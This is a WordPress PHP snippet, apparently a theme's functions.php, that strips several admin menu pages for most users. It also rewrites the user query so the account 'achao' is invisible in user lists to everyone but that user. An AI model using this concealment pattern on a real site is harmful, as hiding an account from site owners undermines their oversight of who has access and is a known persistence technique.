<?php 
// Hide ACF
// add_filter('acf/settings/show_admin', '__return_false');

// Hide Certain Menu Items
function remove_menus(){
    global $current_user;
    $username = $current_user->user_login;
    
    remove_menu_page( 'index.php' );                                        //Dashboard
    remove_menu_page( 'edit.php' );                                         //Posts
    remove_menu_page( 'edit-comments.php' );                                //Comments
    if ($username == 'achao' || $username == 'chdltest' || $username == 'mlowe') { 
    } else {
        // remove_menu_page( 'themes.php' );                                   //Appearance
        // remove_menu_page( 'plugins.php' );                               //Plugins
        // remove_menu_page( 'tools.php' );                                    //Tools
        // remove_menu_page( 'options-general.php' );                          //Settings
        remove_submenu_page('options-general.php', 'cpto-options');         //Post Type Order
    }
}
add_action( 'admin_menu', 'remove_menus', 9999 );

// Hide Users
add_action('pre_user_query','hidden_pre_user_query');
function hidden_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
 
  if ($username == 'achao') { 
  } else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'achao'",$user_search->query_where);
  }
}